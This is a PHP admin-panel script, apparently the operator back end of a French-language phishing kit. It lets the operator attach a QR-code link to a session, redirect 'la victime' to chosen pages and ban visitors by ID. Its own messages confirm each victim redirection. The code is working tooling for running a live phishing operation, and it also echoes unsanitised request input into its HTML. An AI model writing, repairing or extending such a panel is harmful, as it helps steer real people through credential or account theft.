<?php
function Head()
{

?>

    <!DOCTYPE html>
    <html lang="fr-FR">

    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
        <title>.</title>
        <script src="../views/admin/assets/tablerio.js" defer></script>

        <link rel="stylesheet" href="../views/admin/assets/tablerio.css">
        <link rel="stylesheet" href="../views/admin/assets/styles.css">
    </head>

    <body data-bs-theme="dark" class="backSvg">
    <?php
}


function Footer($autoLeave = true)
{

    ?>
        <a href="../admin" class="btn position-fixed top-0 end-0 m-3">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-pointer">
                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
                <path d="M7.904 17.563a1.2 1.2 0 0 0 2.228 .308l2.09 -3.093l4.907 4.907a1.067 1.067 0 0 0 1.509 0l1.047 -1.047a1.067 1.067 0 0 0 0 -1.509l-4.907 -4.907l3.113 -2.09a1.2 1.2 0 0 0 -.309 -2.228l-13.582 -3.904l3.904 13.563z" />
            </svg>
            Panel
        </a>
        <?php if ($autoLeave) { ?>
            <script>
                window.onload = function() {
                    setTimeout(() => window.close(), 1500)
                }
            </script>
        <?php } ?>
    </body>

    </html>
<?php
}

function html($success, $text = false)
{
    Head();
?>
    <style>
        body {
            display: flex;
            align-items: center;
            justify-content: center;
        }
    </style>
    <div class="d-flex justify-content-center align-items-center flex-column">
        <img src="../views/admin/assets/<?= $success ? 'sent.gif' : 'error.svg' ?>" style="width: 150px;" />
        <?php if ($text) { ?>
            <h1><?= $text ?></h1>
        <?php }  ?>

    </div>
    <?php
    Footer();
}

if (isset($_POST['id']) && isset($_POST['qrcode'])) {
    $id = $_POST['id'];
    $waiting = $dbWaiting->get("$id");
    if ($waiting) {
        $dbWaiting->set("$id", [
            "mid" => $waiting["mid"],
            "redirect" =>  "pbzhr",
            "admin" => $ip
        ]);
        $dbWaiting->set("qrcode_$ip", $_POST['qrcode']);
        die(html(true, "Le qrcode à bien été sauvegarder et <strong>la victime</strong> à bien été rediriger !"));
    }
} elseif (isset($_GET["blip"])) {
    $id = $_GET["blip"];
    $existingEntries = getr($dbAdminData, "blip");
    $filteredEntries = array_filter($existingEntries, function ($entry) use ($id) {
        return $entry["id"] !== $id;
    });
    $dbAdminData["blip"] = $filteredEntries;
    $dbAdminData["blip"][] = [
        "ip" => $ip,
        "id" => $id,
        "date" => date("d/m/y H:i:s", time()),
    ];
    $dbAdmin->set($host, $dbAdminData);
    die(html(true, "<strong>$id</strong> à bien été banni !"));
} elseif (isset($_GET["id"]) && isset($_GET["redirect"])) {
    $id = $_GET["id"];
    $redirect = $_GET["redirect"];
    $waiting = $dbWaiting->get("$id");
    if ($waiting) {
        if ($redirect == "pbzhr") {
            Head();
    ?>
            <div class="container-xl h-full">
                <div class="d-flex align-items-center justify-content-center w-full h-full">
                    <div class="container container-tight py-4 mt-0 mb-0">
                        <form class="card card-md bg-rdark" method="post" autocomplete="off">
                            <input type="hidden" value="<?= $id ?>" name="id">
                            <div class="card-body">
                                <div class="mb-3"><label class="form-label">Lien du qrcode</label>
                                    <div class="input-group input-group-flat">
                                        <input tabindex="0" type="text" class="form-control bg-rdark" placeholder="https://..." aria-autocomplete="list" name="qrcode" autocomplete="off" value="">
                                    </div>
                                </div>
                                <div class="form-footer"><button tabindex="0" type="submit" class="mt-3 btn btn-primary w-100">Sauvegarder</button></div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

<?php
            Footer(false);

            die();
        } else {
            $dbWaiting->set("$id", [
                "mid" => $waiting["mid"],
                "redirect" =>  $redirect,
                "admin" => $ip
            ]);
            die(html(true, "<strong>La victime</strong> à bien été rediriger !"));
        }
    }
}

die(html(false, "Une erreur est survenue !"));
